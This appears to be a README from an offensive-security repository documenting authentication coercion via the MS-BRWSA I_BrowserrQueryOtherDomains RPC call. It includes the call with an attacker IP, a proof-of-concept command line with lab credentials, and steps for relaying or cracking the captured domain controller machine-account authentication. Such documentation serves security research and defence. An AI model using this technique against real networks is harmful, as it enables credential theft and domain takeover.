# MS-BRWSA - Remote call to I_BrowserrQueryOtherDomains (opnum 2)

## Summary

+ **Protocol**: [[MS-BRWSA]: Common Internet File System (CIFS) Browser Auxiliary Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/5995d2f2-fff1-40af-9100-ca67794d50a5)

+ **Protocol UUID**: 6bffd098-a112-3610-9833-012892020162

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `"\pipe\browser"`

+ **Function name**: [`I_BrowserrQueryOtherDomains`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/3fdb5c28-c61b-49d0-bd0f-0a704f7dc507)

+ **Function operation number**: `2`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `"\pipe\browser"` and bind to the desired [`MS-BRWSA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/5995d2f2-fff1-40af-9100-ca67794d50a5) protocol (with uuid `6bffd098-a112-3610-9833-012892020162` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-BRWSA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/5995d2f2-fff1-40af-9100-ca67794d50a5) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `"\pipe\browser"` This pipe is connected to the protocol [[MS-BRWSA]: Common Internet File System (CIFS) Browser Auxiliary Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/5995d2f2-fff1-40af-9100-ca67794d50a5) and allows to call RPC functions of this protocol. We will then call the remote [`I_BrowserrQueryOtherDomains`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/3fdb5c28-c61b-49d0-bd0f-0a704f7dc507) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
I_BrowserrQueryOtherDomains('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NET_API_STATUS I_BrowserrQueryOtherDomains(
   [in, string, unique] BROWSER_IDENTIFY_HANDLE ServerName,
   [in, out] LPSERVER_ENUM_STRUCT InfoStruct,
   [out] LPDWORD TotalEntries
 );
```

## References

+ Documentation of protocol [MS-BRWSA]: Common Internet File System (CIFS) Browser Auxiliary Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/5995d2f2-fff1-40af-9100-ca67794d50a5

+ Documentation of function `I_BrowserrQueryOtherDomains`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brwsa/3fdb5c28-c61b-49d0-bd0f-0a704f7dc507